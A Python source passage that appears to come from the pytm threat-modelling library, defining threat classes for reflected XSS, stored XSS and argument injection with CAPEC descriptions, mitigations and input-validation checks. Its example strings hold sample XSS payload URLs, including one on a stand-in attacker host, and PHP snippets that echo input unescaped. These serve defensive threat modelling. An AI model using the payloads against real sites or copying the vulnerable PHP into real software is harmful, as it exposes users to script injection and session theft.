    details: str = "This type of attack is a form of Cross-Site Scripting (XSS) where a malicious script is “reflected” off a vulnerable web application and then executed by a victim's browser. The process starts with an adversary delivering a malicious script to a victim and convincing the victim to send the script to the vulnerable web application. The most common method of this is through a phishing email where the adversary embeds the malicious script with a URL that the victim then clicks on. In processing the subsequent request, the vulnerable web application incorrectly considers the malicious script as valid input and uses it to creates a reposnse that is then sent back to the victim. To launch a successful Reflected XSS attack, an adversary looks for places where user-input is used directly in the generation of a response. This often involves elements that are not expected to host scripts such as image tags (<img>), or the addition of event attibutes such as onload and onmouseover. These elements are often not subject to the same input validation, output encoding, and other content filtering and checking routines."
    likelihood: str = "High"
    severity: str = "Very high"
    prerequisites: str = 'An application that leverages a client-side web browser with scripting enabled.An application that fail to adequately sanitize or encode untrusted input.'
    mitigations: str = 'Use browser technologies that do not allow client-side scripting.Utilize strict type, character, and encoding enforcement.Ensure that all user-supplied input is validated before use.'
    example: str = "Consider a web application that enables or disables some of the fields of a form on the page via the use of a mode parameter provided on the query string. http://my.site.com/aform.html?mode=full The application’s server-side code may want to display this mode value in the HTML page being created to give the users an understanding of what mode they are in. In this example, PHP is used to pull the value from the URL and generate the desired HTML. <?phpecho 'Mode is: ' . $_GET[mode];?> Notice how the value provided on the URL is used directly with no input validation performed and no output encoding in place. A maliciously crafted URL can thus be formed such that if a victim clicked on the URL, a malicious script would then be executed by the victim’s browser: http://my.site.com/aform.html?mode=<script>alert('hi');</script>Reflected XSS attacks can take advantage of HTTP headers to compromise a victim. For example, assume a vulnerable web application called ‘mysite’ dynamically generates a link using an HTTP header such as HTTP_REFERER. Code somewhere in the application could look like: <?phpecho <a href=”$_SERVER[‘HTTP_REFERER’]”>Test URL</a>?> The HTTP_REFERER header is populated with the URI that linked to the currently executing page. A web site can be created and hosted by an adversary that takes advantage of this by adding a reference to the vulnerable web application. By tricking a victim into clicking a link that executes the attacker’s web page, such as: http://attackerswebsite.com?<script>malicious content</script> The vulnerable web application (‘mysite’) is now called via the attacker’s web site, initiated by the victim’s web browser. The HTTP_REFERER header will contain a malicious script, which is embedded into the page by the vulnerable application and served to the victim. The victim’s web browser then executes the injected script, thus compromising the victim’s machine."
    references: str = 'https://capec.mitre.org/data/definitions/591.html'

    def _check_condition(self, target) -> bool:
        return target.allowsClientSideScripting is True and (target.controls.sanitizesInput is False or target.controls.validatesInput is False)

class INP40(Threat):
    """Stored XSS."""

    id: str = 'INP40'
    target: tuple = (pytm.Process,)
    description: str = 'Stored XSS'
    details: str = "This type of attack is a form of Cross-site Scripting (XSS) where a malicious script is persistenly “stored” within the data storage of a vulnerable web application. Initially presented by an adversary to the vulnerable web application, the malicious script is incorrectly considered valid input and is not properly encoded by the web application. A victim is then convinced to use the web application in a way that creates a response that includes the malicious script. This response is subsequently sent to the victim and the malicious script is executed by the victim's browser. To launch a successful Stored XSS attack, an adversary looks for places where stored input data is used in the generation of a response. This often involves elements that are not expected to host scripts such as image tags (<img>), or the addition of event attibutes such as onload and onmouseover. These elements are often not subject to the same input validation, output encoding, and other content filtering and checking routines."
    likelihood: str = "High"
    severity: str = "Very high"
    prerequisites: str = 'An application that leverages a client-side web browser with scripting enabled.An application that fails to adequately sanitize or encode untrusted input.An application that stores information provided by the user in data storage of some kind.'
    mitigations: str = 'Use browser technologies that do not allow client-side scripting.Utilize strict type, character, and encoding enforcement.Ensure that all user-supplied input is validated before being stored.'
    example: str = "An adversary determines that a system uses a web based interface for administration. The adversary creates a new user record and supplies a malicious script in the user name field. The user name field is not validated by the system and a new log entry is created detailing the creation of the new user. Later, an administrator reviews the log in the administrative console. When the administrator comes across the new user entry, the browser sees a script and executes it, stealing the administrator's authentication cookie and forwarding it to the adversary. An adversary then uses the received authentication cookie to log in to the system as an administrator, provided that the administrator console can be accessed remotely.An online discussion forum allows its members to post HTML-enabled messages, which can also include image tags. An adversary embeds JavaScript in the image tags of his message. The adversary then sends the victim an email advertising free goods and provides a link to the form for how to collect. When the victim visits the forum and reads the message, the malicious script is executed within the victim's browser."
    references: str = 'https://capec.mitre.org/data/definitions/592.html'

    def _check_condition(self, target) -> bool:
        return target.allowsClientSideScripting is True and (target.controls.sanitizesInput is False or target.controls.validatesInput is False)

class INP41(Threat):
    """Argument Injection."""

    id: str = 'INP41'
    target: tuple = (pytm.Process,)
    description: str = 'Argument Injection'
    details: str = 'An attacker changes the behavior or state of a targeted application through injecting data or command syntax through the targets use of non-validated and non-filtered arguments of exposed services or methods.'
    likelihood: str = "High"
    severity: str = "High"
    prerequisites: str = 'Target software fails to strip all user-supplied input of any content that could cause the shell to perform unexpected actions.Software must allow for unvalidated or unfiltered input to be executed on operating system shell, and, optionally, the system configuration must allow for output to be sent back to client.'
    mitigations: str = 'Design: Do not program input values directly on command shell, instead treat user input as guilty until proven innocent. Build a function that takes user input and converts it to applications specific types and values, stripping or filtering out all unauthorized commands and characters in the process.Design: Limit program privileges, so if metacharacters or other methods circumvent program input validation routines and shell access is attained then it is not running under a privileged account. chroot jails create a sandbox for the application to execute in, making it more difficult for an attacker to elevate privilege even in the case that a compromise has occurred.Implementation: Implement an audit log that is written to a separate host, in the event of a compromise the audit log may be able to provide evidence and details of the compromise.'
    example: str = 'A recent example instance of argument injection occurred against Java Web Start technology, which eases the client side deployment for Java programs. The JNLP files that are used to describe the properties for the program. The client side Java runtime used the arguments in the property setting to define execution parameters, but if the attacker appends commands to an otherwise legitimate property file, then these commands are sent to the client command shell. [R.6.2]'
    references: str = 'https://capec.mitre.org/data/definitions/6.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False or target.controls.sanitizesInput is False
